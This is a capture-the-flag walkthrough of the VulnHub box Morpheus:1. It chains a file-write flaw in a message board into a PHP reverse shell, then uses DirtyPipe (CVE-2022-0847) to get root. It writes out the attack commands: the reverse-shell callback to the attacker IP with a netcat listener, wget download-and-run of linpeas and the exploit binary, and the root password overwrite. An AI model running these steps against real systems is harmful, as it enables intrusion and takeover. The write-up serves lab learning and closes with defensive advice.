---
title: "Morpheus:1"
tagline: "An arbitrary file-write in a message board, chained into DirtyPipe (CVE-2022-0847) for root."
category: CTF
difficulty: Intermediate
platform: VulnHub
date: 2026-02-01
---

> **Attacker IP:** `192.168.56.12` &nbsp;·&nbsp; **Target IP:** `192.168.56.18`

## 📋 Overview
This guide documents the complete penetration testing methodology for Morpheus:1. The box hinges on an arbitrary file-write vulnerability in a web message board, chained into a kernel-level privilege escalation via **DirtyPipe (CVE-2022-0847)**.

## 🎯 Objectives
- Identify the target system and open services
- Enumerate web content and hidden functionality
- Exploit a file-write vulnerability to gain a foothold
- Escalate privileges using a kernel exploit
- Capture both flags

## 1. Reconnaissance

```bash
$ ifconfig
$ nmap -sn 192.168.56.0/24
$ nmap -A 192.168.56.18
```
<p align="center"><img src="https://raw.githubusercontent.com/itstallam/Morpheus/main/Screenshots/s1.png" alt="ifconfig confirming attacker interface"></p>
<p align="center"><img src="https://raw.githubusercontent.com/itstallam/Morpheus/main/Screenshots/s3.png" alt="Nmap aggressive scan results"></p>

**Findings:**

| Port | Service | Version |
|------|---------|---------|
| 22/tcp | SSH | OpenSSH 8.4p1 Debian 5 |
| 80/tcp | HTTP | Apache httpd 2.4.51 (Debian) |
| 81/tcp | HTTP | nginx 1.18.0 (Basic Auth required) |

<p align="center"><img src="https://raw.githubusercontent.com/itstallam/Morpheus/main/Screenshots/s4.png" alt="Port 80 Matrix-themed landing page"></p>

## 2. Web Enumeration

```bash
$ gobuster dir -u http://192.168.56.18 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.txt,.html
```
<p align="center"><img src="https://raw.githubusercontent.com/itstallam/Morpheus/main/Screenshots/s6.png" alt="Gobuster directory brute-force"></p>

`/graffiti.php` loads a **"Nebuchadnezzar Graffiti Wall"** — posted messages get written to `/graffiti.txt` and displayed, an immediate candidate for a file-write vulnerability.

<p align="center"><img src="https://raw.githubusercontent.com/itstallam/Morpheus/main/Screenshots/s8.png" alt="Graffiti Wall message board"></p>

## 3. Exploitation — From Graffiti to Shell

Route Firefox through Burp Suite and intercept a graffiti submission:

```http
POST /graffiti.php HTTP/1.1
message=to+be+intercepted+by+burp&file=graffiti.txt
```
<p align="center"><img src="https://raw.githubusercontent.com/itstallam/Morpheus/main/Screenshots/s13.png" alt="Intercepted graffiti POST request"></p>

The `file` parameter controls the destination filename — meaning it's possible to write to **any** file the web server can touch, including `.php` files.

Grab pentestmonkey's PHP reverse shell, point it at the attacker IP, then use Burp Repeater to resend the POST with the payload as the message body and `file=intercept.php`:

```php
$ip = '192.168.56.12';
$port = 7777;
```
<p align="center"><img src="https://raw.githubusercontent.com/itstallam/Morpheus/main/Screenshots/s15.png" alt="Burp Repeater payload"></p>

```bash
$ nc -lvnp 7777
```
Visiting `http://192.168.56.18/intercept.php` triggers the callback:
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
<p align="center"><img src="https://raw.githubusercontent.com/itstallam/Morpheus/main/Screenshots/s18.png" alt="Reverse shell as www-data"></p>

```bash
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@morpheus:/$ cat FLAG.txt
Flag 1!
```
<p align="center"><img src="https://raw.githubusercontent.com/itstallam/Morpheus/main/Screenshots/s20.png" alt="First flag captured"></p>

## 4. Privilege Escalation

> Stage files in `/tmp` — universally writable, avoiding permission errors.

```bash
www-data@morpheus:/tmp$ wget http://192.168.56.12:5678/linpeas1.sh
www-data@morpheus:/tmp$ ./linpeas1.sh
```
<p align="center"><img src="https://raw.githubusercontent.com/itstallam/Morpheus/main/Screenshots/s23.png" alt="LinPEAS flagging CVE-2022-0847"></p>

LinPEAS flags **CVE-2022-0847 (DirtyPipe)** — the target runs a vulnerable kernel (`5.10.70`).

```bash
$ git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
```

The stock `compile.sh` produces dynamically-linked binaries, but this VM lacks the shared libraries to run them — edit it to use **`gcc -static`** instead:

```bash
$ gcc -static exploit1.c -o exploit-9
```
<p align="center"><img src="https://raw.githubusercontent.com/itstallam/Morpheus/main/Screenshots/s26.png" alt="Statically compiling the exploit"></p>

```bash
$ python3 -m http.server 5678
www-data@morpheus:/tmp$ wget http://192.168.56.12:5678/exploit-9
www-data@morpheus:/tmp$ chmod +x exploit-9
www-data@morpheus:/tmp$ ./exploit-9
```
```
Backing up /etc/passwd to /tmp/passwd.bak ...
Setting root password to "piped"...
```
<p align="center"><img src="https://raw.githubusercontent.com/itstallam/Morpheus/main/Screenshots/s30.png" alt="DirtyPipe exploit overwriting root password"></p>

```bash
www-data@morpheus:/$ su root
Password: piped
root@morpheus:/# whoami
root
```
<p align="center"><img src="https://raw.githubusercontent.com/itstallam/Morpheus/main/Screenshots/s32.png" alt="Confirming root access"></p>

## 5. Capturing the Final Flag

```bash
root@morpheus:/# cat /root/FLAG.txt
You've won!
```
<p align="center"><img src="https://raw.githubusercontent.com/itstallam/Morpheus/main/Screenshots/s35.png" alt="Final flag captured"></p>

🎉 **Root access achieved — both flags captured!**

## 6. Summary of Attack Chain

| Phase | Technique | Tool / Payload |
|-------|-----------|----------------|
| Recon | Network & service scan | `nmap -sn`, `nmap -A` |
| Enumeration | Directory brute-force | `gobuster` |
| Exploitation | File-write via `file` parameter | Burp Suite + PHP reverse shell |
| Initial Access | Reverse shell callback | `nc -lvnp 7777` |
| Post-Exploitation | Automated privesc enumeration | `linpeas.sh` |
| Privilege Escalation | Kernel exploit (DirtyPipe) | `CVE-2022-0847` static binary |
| Root Access | Password overwrite + `su` | Custom-compiled `exploit-9` |

## 🔑 Key Takeaways
1. **Use `gcc -static`** when compiling exploits for unknown target environments.
2. **Stage files in `/tmp`** when transferring payloads to a compromised host.
3. **Intercept everything** — the `file` parameter was invisible until proxied through Burp.
4. **Kernel version is king** — LinPEAS plus a CVE check turned a long privesc hunt into a single exploit.

## 🔒 Security Recommendations
- **Input Validation** — never let user input control a filename or path server-side
- **File Upload/Write Restrictions** — block writes of executable extensions into web-servable directories
- **Kernel Patch Management** — keep kernels current
- **Least Privilege** — run web processes with minimal filesystem permissions
- **Log Monitoring** — alert on unexpected file writes and outbound connections

## 🔧 Tools Used
`ifconfig` · `nmap` · `gobuster` · Burp Suite · `netcat` · `linpeas.sh` · `gcc -static` · CVE-2022-0847 · `su`
